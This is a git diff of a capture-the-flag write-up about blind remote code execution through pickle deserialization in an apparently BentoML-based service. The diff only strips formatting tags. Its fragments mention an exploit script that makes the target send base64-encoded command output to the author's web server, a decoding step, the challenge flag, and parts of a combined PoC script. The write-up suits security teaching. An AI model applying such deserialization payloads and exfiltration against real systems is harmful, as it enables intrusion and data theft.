@@ -94,7 +94,6 @@ Well, if we set that in our request we get yet another new error: `Error during 
 
 Don't worry, that's just because our command was invalid (we're doing this blind). Always remember an error does not mean a command wasn't successful! How about a script like this?
 
-{% code overflow="wrap" %}
 
 ```python
 import pickle
@@ -118,13 +117,11 @@ print(response.text)
 #     f.write(result)
 ```
 
-{% endcode %}
 
 The web server gets a hit and a base64-encoded value is logged as a GET parameter.
 
 ![](./images/10.PNG)
 
-{% code overflow="wrap" %}
 
 ```bash
 echo "YmVudG9maWxlLnlhbWwKYmV0YV9zZXJ2aWNlLnB5CmZsYWcudHh0Cg==" | base64 -d
@@ -133,7 +130,6 @@ beta_service.py
 flag.txt
 ```
 
-{% endcode %}
 
 Repeat above but with `cat flag.txt` to solve the challenge 😌
 
@@ -143,7 +139,6 @@ Flag: `FLAG{b3n70_ml_607_50m3_m4j0r_155u35}`
 
 The DB clears every 30 mins so why not wrap everything into a single PoC?
 
-{% code overflow="wrap" %}
 
 ```python
 import requests
@@ -255,7 +250,6 @@ if __name__ == "__main__":
     exploit(login_cookies)
 ```
 
-{% endcode %}
 
 ### Summary
 
